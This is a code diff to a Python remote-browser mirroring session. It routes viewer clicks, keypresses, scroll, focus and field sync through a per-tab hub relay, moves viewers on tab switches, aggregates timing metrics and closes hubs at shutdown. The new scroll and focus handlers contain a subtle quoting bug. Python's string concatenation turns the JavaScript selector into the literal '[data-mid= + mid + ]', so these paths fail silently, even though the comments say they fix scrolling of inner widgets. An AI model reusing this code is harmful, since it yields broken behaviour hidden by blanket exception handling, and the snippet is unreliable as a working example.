+        that is what per-tab state means — but this app mirrors ONE tab at a
+        time, so a switch has to carry the sockets across.  Re-attaching (rather
+        than repointing a stream) is also what makes the switch correct: the
+        viewer receives the new tab's join payload, i.e. its latest snapshot plus
+        the tail held after it, instead of a blank frame and a wait.
+        """
+        previous = self.mirror_hubs.get(previous_tab_id) if previous_tab_id else None
+        target = self._active_hub()
+        if target is None or previous is None or previous is target:
+            return 0
+        moved = 0
+        for viewer_id, sink in [(v.viewer_id, v.sink) for v in list(previous.viewers.values())]:
+            try:
+                asyncio.create_task(previous.detach_viewer(viewer_id))
+            except RuntimeError:
+                previous.viewers.pop(viewer_id, None)
+            try:
+                target.attach_viewer(sink, viewer_id=viewer_id)
+                moved += 1
+            except Exception:
+                logger.debug("[HUB] re-subscribe viewer %s on tab %s failed",
+                             viewer_id, target.tab_id, exc_info=True)
+        if moved:
+            logger.debug("[HUB] session=%s moved %d viewer(s) %s -> %s",
+                         self.session_id, moved, previous_tab_id, target.tab_id)
+        return moved
+
+    async def _relay_input(self, action: str, handler, *, force: bool = False) -> str:
+        """Run one forwarded interaction through the gateway's input relay.
+
+        Without a hub the action is executed inline — exactly the pre-gateway
+        behaviour — so the relay can be adopted (and rolled back) per session.
+        """
+        hub = self._active_hub()
+        relay = getattr(hub, "relay", None) if hub is not None else None
+        if relay is None:
+            try:
+                await handler()
+                return "ok"
+            except Exception as exc:
+                logger.debug("[INPUT] %s failed: %s", action, exc)
+                return "error"
+        viewer_id = None
+        viewer = hub.viewer_for(self.websocket)
+        if viewer is not None:
+            viewer_id = viewer.viewer_id
+        return await relay.submit(action, handler, viewer_id=viewer_id, force=force)
+
+    def mirror_stats(self) -> Dict[str, Any]:
+        """Per-tab gateway state for the diagnostics endpoint (§9)."""
+        return {
+            "enabled": self._gateway_enabled(),
+            "tabs": [hub.stats() for hub in self.mirror_hubs.values()],
+        }
+
+    def mirror_metrics(self) -> Dict[str, Any]:
+        """Aggregated pipeline timings across this session's tabs."""
+        aggregate: Dict[str, Any] = {"counters": {}, "lanes": {}}
+        for hub in self.mirror_hubs.values():
+            for name, value in hub.metrics.counters.items():
+                aggregate["counters"][name] = aggregate["counters"].get(name, 0) + value
+            for lane, stages in hub.metrics.as_dict()["lanes"].items():
+                bucket = aggregate["lanes"].setdefault(lane, {})
+                for stage, sample in stages.items():
+                    cur = bucket.get(stage)
+                    if cur is None or sample["count"] == 0:
+                        bucket[stage] = dict(sample)
+                        continue
+                    total = cur["mean_ms"] * cur["count"] + sample["mean_ms"] * sample["count"]
+                    count = cur["count"] + sample["count"]
+                    bucket[stage] = {
+                        "count": count,
+                        "mean_ms": round(total / count, 2) if count else 0.0,
+                        "max_ms": round(max(cur["max_ms"], sample["max_ms"]), 2),
+                        "last_ms": sample["last_ms"],
+                        "bytes": cur["bytes"] + sample["bytes"],
+                    }
+        return aggregate
+
+    def attach_dom_capture(self, page: Any, websocket: Any = None, client_id: Optional[str] = None,
+                           hub: Any = None):
         """Attach the reusable DOM capture layer to this session."""
-        self.dom_capture = DOMCaptureSession(page=page, websocket=websocket or self.websocket, client_id=client_id or self.session_id)
+        self.dom_capture = DOMCaptureSession(page=page, websocket=websocket or self.websocket,
+                                             client_id=client_id or self.session_id,
+                                             hub=hub if hub is not None else self._active_hub())
         return self.dom_capture
 
     async def capture_remote_page(self, reason: Optional[str] = None, force: bool = False):
@@ -1706,6 +1385,7 @@ class NeoStreamingSession:
             try:
                 if self.dom_capture is not None:
                     self._sync_dom_capture()
+                    self._move_viewers_to_active_hub(old_page_id)
                     await self.capture_remote_page(reason="tab_switch", force=True)
             except Exception as e:
                 log_error(f"[TABS] Error rebinding DOM capture: {e}")
@@ -2189,6 +1869,22 @@ class NeoStreamingSession:
             log_error(f"[PERMISSIONS] Error handling permission response: {e}")
     
     async def handle_input(self, input_data: Dict):
+        """Forward one viewer gesture to the authoritative page.
+
+        The gate and the ordering tail live in the hub's relay (see
+        ``mirror_gateway.MirrorInputRelay``): a gesture aimed at a document the
+        viewer has not applied yet waits for the ack, and everything for one tab
+        runs in the order the visitor performed it.  This method returns as soon
+        as the action is queued, so a slow website action cannot stall the
+        viewer's input thread.
+        """
+        return await self._relay_input(
+            "input:" + str(input_data.get('subtype') or input_data.get('event')
+                        or input_data.get('type') or ''),
+            lambda: self._dispatch_input(input_data),
+        )
+
+    async def _dispatch_input(self, input_data: Dict):
         """Handle remote-browser input using the client CSS pixel coordinates directly."""
         if not self.is_active or not self.page:
             # Per-event path: one line per window, not one per mouse move.
@@ -2341,8 +2037,60 @@ class NeoStreamingSession:
             elif event == 'scroll_sync':
                 scroll_x = int(input_data.get('scrollX', 0))
                 scroll_y = int(input_data.get('scrollY', 0))
+                mid = input_data.get('mid')
+                if mid:
+                    # Node-aware scroll: the visitor moved an inner scroller
+                    # (a menu, a chat pane, a virtualised list).  Those are the
+                    # containers whose position the site itself tracks, so the
+                    # scroll has to be applied to THAT node — scrolling the
+                    # window instead leaves the widget unmoved and is the reason
+                    # "I can scroll the page but not the list" used to happen.
+                    try:
+                        await page.evaluate(
+                            "([mid, x, y]) => {"
+                            " const el = document.querySelector('[data-mid="' + mid + '"]');"
+                            " if (!el) return false;"
+                            " if (el === document.scrollingElement || el === document.body)"
+                            "   { window.scrollTo(x, y); return true; }"
+                            " el.scrollTo ? el.scrollTo(x, y) : (el.scrollLeft = x, el.scrollTop = y);"
+                            " return true; }",
+                            [str(mid), scroll_x, scroll_y],
+                        )
+                    except Exception:
+                        try:
+                            await page.evaluate(f"window.scrollTo({scroll_x}, {scroll_y});")
+                        except Exception:
+                            pass
+                else:
+                    try:
+                        await page.evaluate(f"window.scrollTo({scroll_x}, {scroll_y});")
+                    except Exception:
+                        pass
+
+            elif event == 'focus':
+                # Focus is forwarded as an action, not as a value: Browser A
+                # decides what focusing a control does (its own listeners, its
+                # own keyboard behaviour), and the mirror just follows.
+                mid = input_data.get('mid')
+                selector = input_data.get('selector')
                 try:
-                    await page.evaluate(f"window.scrollTo({scroll_x}, {scroll_y});")
+                    if mid:
+                        await page.evaluate(
+                            "(mid) => {"
+                            " const el = document.querySelector('[data-mid="' + mid + '"]');"
+                            " if (el && el.focus) el.focus({preventScroll: true});"
+                            " }",
+                            str(mid),
+                        )
+                    elif selector:
+                        await page.focus(str(selector))
+                except Exception:
+                    pass
+
+            elif event == 'blur':
+                try:
+                    await page.evaluate("() => { const a = document.activeElement;"
+                                        " if (a && a.blur) a.blur(); }")
                 except Exception:
                     pass
 
@@ -2551,13 +2299,23 @@ class NeoStreamingSession:
                 )
 
     async def handle_click(self, selector: Optional[str] = None, mid: Optional[str] = None):
-        if self.dom_capture:
-            await self.dom_capture.handle_click(selector=selector, mid=mid)
+        async def _go():
+            if self.dom_capture:
+                handled = await self.dom_capture.handle_click(selector=selector, mid=mid)
+                if not handled:
+                    # The control the viewer pressed is not in the live DOM: the
+                    # mirror is behind.  Ship the current document — the same
+                    # "pressed something stale -> give them the page" contract
+                    # the coordinate path already has.
+                    await self.capture_remote_page(reason='click', force=True)
+        return await self._relay_input('click', _go)
 
     async def handle_navigation(self, url: str):
-        if self.dom_capture:
-            self._apply_snapshot_preference(url)
-            await self.dom_capture.handle_navigation(url)
+        async def _go():
+            if self.dom_capture:
+                self._apply_snapshot_preference(url)
+                await self.dom_capture.handle_navigation(url)
+        return await self._relay_input('navigate', _go)
 
     async def handle_prefetch(self, url: str):
         """Warm the next page's assets before the click lands.
@@ -2590,6 +2348,14 @@ class NeoStreamingSession:
             pass
 
     async def handle_keypress(self, key: str, selector: Optional[str] = None, ctrl: bool = False, shift: bool = False, alt: bool = False, mid: Optional[str] = None):
+        return await self._relay_input(
+            'keypress',
+            lambda: self._dispatch_keypress(key, selector, ctrl, shift, alt, mid),
+        )
+
+    async def _dispatch_keypress(self, key: str, selector: Optional[str] = None,
+                                 ctrl: bool = False, shift: bool = False, alt: bool = False,
+                                 mid: Optional[str] = None):
         if not self.page or not self.dom_capture:
             return
         try:
@@ -2650,6 +2416,23 @@ class NeoStreamingSession:
     async def handle_input_sync(self, mid: Optional[str] = None, selector: Optional[str] = None,
                                 name: Optional[str] = None, field_id: Optional[str] = None,
                                 value: str = '', checked: Optional[bool] = None):
+        """Text editing / checkbox state from the mirror, forwarded as an action.
+
+        The value here is the visitor's own in-progress text for the field they
+        are editing in Browser B — it is applied to the real page and never
+        stored, reported, or copied anywhere else.  Sensitive fields are excluded
+        from the mirror's capture side (see ``dom_capture.pushVal``), so a
+        password, one-time code or card credential never rides this channel in
+        either direction.
+        """
+        return await self._relay_input(
+            'input_sync',
+            lambda: self._dispatch_input_sync(mid, selector, name, field_id, value, checked),
+        )
+
+    async def _dispatch_input_sync(self, mid: Optional[str] = None, selector: Optional[str] = None,
+                                   name: Optional[str] = None, field_id: Optional[str] = None,
+                                   value: str = '', checked: Optional[bool] = None):
         """Absolute-value sync from the mirror client.  Idempotent; immune to
         DOM churn as long as ONE of the addressing keys still resolves:
         data-mid (stamped by the capture) -> CSS selector -> name -> id.
@@ -3045,6 +2828,25 @@ class NeoStreamingSession:
         except Exception:
             logger.debug("[Reconnect] DOM capture rebind failed", exc_info=True)
 
+        # Reconnect recovery (MIRROR_GATEWAY.md §2): the hub hands the new socket
+        # its join payload — the latest valid snapshot plus every delta still held
+        # after it — so a dropped connection costs a catch-up replay, never a
+        # fresh capture of the page.
+        #
+        # There is deliberately no resume cursor here. A reconnecting socket is a
+        # new transport whose last *rendered* state we cannot verify (the old one
+        # died mid-flight, which is why we are reconnecting), and resuming from an
+        # unverified position is how a mirror ends up permanently one patch wrong.
+        # Replaying the tail is bounded by the history budget, and the client
+        # dedupes by (epoch, seq) — so correctness costs at most a few redundant
+        # frames. The one place a resume IS honoured is a same-socket re-attach
+        # that carries an explicit `resume` (see the /ws handler in api.py), where
+        # the viewer told us what it has acked.
+        try:
+            self.attach_mirror_viewer(new_websocket)
+        except Exception:
+            logger.debug("[Reconnect] mirror viewer attach failed", exc_info=True)
+
         # Update state
         self.last_activity = time.time()
         self.inputs_enabled = True
@@ -3203,6 +3005,13 @@ class NeoStreamingSession:
         # Stop URL/delta capture tasks and release this runtime session's
         # asset leases before the live page is closed.
         try:
+            for hub in list(self.mirror_hubs.values()):
+                try:
+                    await hub.close()
+                except Exception:
+                    logger.debug("[HUB] close failed", exc_info=True)
+            self.mirror_hubs.clear()
+            self.mirror_hub = None
             if self.dom_capture:
                 await self.dom_capture.shutdown()
         except Exception:
